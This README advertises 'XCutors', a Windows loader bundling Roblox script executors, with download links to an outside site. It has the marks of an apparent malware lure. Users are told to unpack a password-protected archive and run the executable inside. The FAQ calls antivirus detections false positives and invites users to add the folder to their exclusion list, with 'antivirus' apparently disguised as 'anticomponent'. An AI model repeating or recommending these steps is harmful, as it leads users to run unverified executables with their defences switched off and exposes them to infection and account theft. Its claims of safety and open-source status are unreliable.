# **XCutors – Roblox Script Executors**

**Run Lua scripts and enhance your Roblox experience**

XCutors is a powerful collection of script executors designed for Roblox players who want to customize their gameplay, automate tasks, and unlock new features. With support for popular executors like Volt, Synapse Z, Potassium, Wave, and our own universal loader, XCutors provides a reliable and user-friendly solution for running Lua scripts in any Roblox game.

[![Website](https://img.shields.io/badge/Website-xcutors.gamer.gd-blueviolet?style=for-the-badge&logo=google-chrome)](https://xcutors.gamer.gd) [![Download](https://img.shields.io/badge/Download-Latest_Cyan?style=for-the-badge&logo=windows)](https://xcutors.gamer.gd)

## Features

- Universal XCutors Loader – a single entry point that detects and launches any bundled executor (Volt, Synapse Z, Potassium, Wave) automatically.
- Multiple executor support – Volt, Synapse Z, Potassium, and Wave are pre-packaged and ready to use out of the box.
- Built-in script hub with categorized example scripts so you can get started within minutes of installation.
- One-click executor switching – swap between different executor backends without closing the loader or restarting Roblox.
- Automatic dependency checker that verifies Visual C++ redistributables, .NET runtime, and other prerequisites on first launch.
- Persistent settings and per-executor configuration profiles that remember your preferences across sessions.
- Lightweight Windows desktop GUI (WPF / WinForms) with a clean dark theme and minimal resource usage.
- Regular update checker that notifies you when a new version of any bundled executor is available.
- Detailed log console inside the loader for real-time feedback, error messages, and script execution status.
- Portable mode option – run entirely from a USB drive without modifying the host system beyond standard prerequisites.

## System Requirements

- Windows 10 or later (64-bit)
- 2 GB RAM minimum (1 GB may work but not guaranteed)
- 200 MB free disk space
- Internet connection for updates and script downloads
- Microsoft Visual C++ Redistributable (latest version recommended)
- Roblox client installed and updated

## How to Install

1. Download the executor you like from the Our Loaders section, or grab the universal loader above.
2. You will receive an archive file (ZIP or RAR).
3. Extract the archive using the password below: `xcutors`.
4. Run the extracted executable and follow the on-screen instructions.
5. Launch Roblox, inject the executor, and enjoy!

## Screenshots

[![Website Preview](https://i.ibb.co/hxcqWR61/site-Prev.png)](https://xcutors.gamer.gd)
[![Available Executors](https://i.ibb.co/LXXDC1bd/our-Loaders.png)](https://xcutors.gamer.gd)

## FAQ

### What exactly is XCutors?

XCutors is a unified loader and launcher package that bundles several popular Roblox executors (Volt, Synapse Z, Potassium, Wave) into a single Windows desktop application, letting you switch between them without managing separate installers.

### Is XCutors free to use?

Yes, the XCutors loader itself is completely free and open-source. Some individual executors bundled inside may have their own licensing – check their respective documentation.

### Which versions of Windows are supported?

XCutors officially supports Windows 10 (build 1903+) and Windows 11, both 64-bit editions. Older Windows versions are not guaranteed to work.

### Why does my anticomponent flag the download?

Because these tools interact with the Roblox client process at runtime, some anticomponent engines may produce false-positive detections. You can safely add the XCutors folder to your exclusion list if you trust the source.

### How do I update a bundled executor?

Open the XCutors loader, go to the Updates tab, and click Check for Updates. The loader will download the latest compatible version of each executor and replace the files automatically.

### Can I add my own executor to the loader?

Yes. Place your executor executable inside the Executors\Custom folder, create a simple JSON descriptor file following the template in Docs\custom-executor.json, and it will appear in the Executor dropdown on next launch.

### The loader opens but the Launch button stays greyed out – what should I do?

This usually means a required dependency is missing. Open the Log tab to see which runtime the checker flagged, install it, then restart the loader.

### Does XCutors work on macOS or Linux?

No. XCutors is a Windows-only application. The bundled executors also depend on Windows-specific APIs, so there is no cross-platform support at this time.

## Download

[![Download Now](https://img.shields.io/badge/Download-All_Executors-cyan?style=for-the-badge&logo=windows)](https://xcutors.gamer.gd)

## Disclaimer

This project is for educational purposes only. Use at your own risk. The developers are not responsible for any account restrictions or damages resulting from the use of this software.